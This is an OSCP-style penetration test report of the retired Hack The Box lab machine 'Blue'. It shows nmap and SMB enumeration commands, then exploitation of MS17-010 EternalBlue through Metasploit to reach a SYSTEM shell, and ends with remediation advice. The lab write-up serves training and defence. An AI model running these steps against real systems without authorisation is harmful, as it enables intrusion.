# HTB Blue - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2025-11-21

**Target:** 10.129.23.90

**Environment:** HTB Blue (Retired Machine)

---

## 1. Executive Summary

A penetration test was conducted against the target host at 10.129.23.90. The objective was to identify exploitable vulnerabilities, gain unauthorized access, and obtain proof-of-access artifacts (user and administrator flags).

During testing, open SMB services (TCP 445) combined with the OS fingerprint (**Windows 7 SP1**) indicated a high likelihood of exposure to the **MS17-010 EternalBlue** vulnerability. After confirming the vulnerability through SMB scanning, remote code execution was achieved and full SYSTEM-level access was obtained.

---

## 2. Scope

- **In-scope host:** 10.129.23.90
- **Assessment format:** Black-box
- **Allowed tools:** All standard OSCP-approved tooling
- **Objective:** Gain shell access, escalate privileges, and retrieve flags.

---

## 3. Methodology

This methodology follows the OSCP exam structure:

1. Reconnaissance
2. Enumeration
3. Vulnerability Analysis
4. Exploitation
5. Privilege Escalation
6. Proof of Access

All steps are fully documented below.

---

## 4. Reconnaissance

### 4.1 Full Port Scan

A full TCP scan detected several Microsoft RPC and SMB services.

```
nmap -p- -sCV 10.129.23.90 -T4 -oA blue_initial
```

The relevant finding was:

- 445/tcp - microsoft-ds - Windows 7 Professional SP1

The combination of:

- Windows 7 SP1
- SMB service
- No message signing requirement

immediately suggests investigating **MS17-010**.

---

## 5. Enumeration

### 5.1 SMB Vulnerability Scan

```
nmap --script smb-vuln* -p445 10.129.23.90
```
The scan confirmed the presence of **MS17-010 EternalBlue**.

Multiple Python proof-of-concept exploits were available, but due to deprecated Python2 dependencies and byte-handling errors, manual execution was not feasible.

### 5.2 SMB Share Enumeration

```
smbclient -L //10.129.23.90
```

Only default admin shares were present.

---

## 6. Exploitation

Because the manual Python exploits were incompatible with the modern Kali environment, exploitation proceeded using the MS17-010 module from Metasploit.

### 6.1 Module Selection

```
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
```

### 6.2 Configuration

```
set RHOSTS 10.129.23.90
set LHOST tun0
run
```

### 6.3 Result

The exploit successfully returned a SYSTEM-level Meterpreter session (**NT AUTHORITY\SYSTEM**).

---

## 7. Privilege Escalation

No local escalation was required because MS17-010 directly yields **NT AUTHORITY\SYSTEM**.

---

## 8. Proof of Access

### 8.1 User Flag - *REDACTED*

```
type C:\Users\haris\Desktop\user.txt
```

### 8.2 Root Flag - *REDACTED*

```
type C:\Users\Administrator\Desktop\root.txt
```

---

## 9. Findings & Recommendations

### Finding: MS17-010 EternalBlue (Critical RCE)

- Remote Code Execution vulnerability in Windows SMBv1.
- Allows unauthenticated attackers to execute arbitrary code as SYSTEM.

### Impact

- Full system compromise
- Lateral movement potential
- Data exfiltration
- Worm propagation vector

### Recommendation

- Apply Microsoft security update for MS17-010
- Disable SMBv1
- Enforce SMB signing
- Apply standard patch/asset management controls

---

## 10. Conclusion

The target machine was vulnerable to the EternalBlue exploit. Through enumeration and exploitation, full administrative access was achieved, and both flags were successfully obtained. The vulnerability is severe and requires urgent remediation in real environments.